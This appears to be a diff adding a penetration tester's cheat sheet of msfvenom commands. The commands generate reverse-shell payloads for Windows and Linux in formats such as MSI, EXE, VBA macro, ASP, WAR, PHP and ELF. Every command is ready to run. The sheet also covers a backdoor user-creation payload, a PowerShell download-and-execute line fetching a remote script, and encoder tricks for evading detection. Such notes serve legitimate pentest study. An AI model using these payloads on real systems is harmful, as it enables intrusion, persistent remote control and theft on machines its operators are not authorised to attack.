@@ -1,0 +1,24 @@
+WINDOWS:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.71 LPORT=445 -f msi -o evil.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.207 LPORT=443 -f exe > disco-64.exe
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.234 lport=443 -e x86/shikata_ga_nai -f vba-psh > macro.txt
+msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+
+
+LINUX:
+msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.49.71 LPORT=53 -f elf-so -o 4.so
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=443 -f war > kraken.war
+msfvenom -p php/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+msfvenom -p linux/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f py
+^ https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86
+
+
+
+TRICKS:
+-b "\x00\x0a\x0d" (command bad chars for shellcode)
+-e x86/shikata_ga_nai -i 5 (encoder with iteration of 5)
+EXITFUNC=thread (This method is used in most exploitation scenarios where the exploited process runs the shellcode in a sub-thread and exiting this thread results in a clean exit)
+PrependSetuid=True (execute as SUID bit)
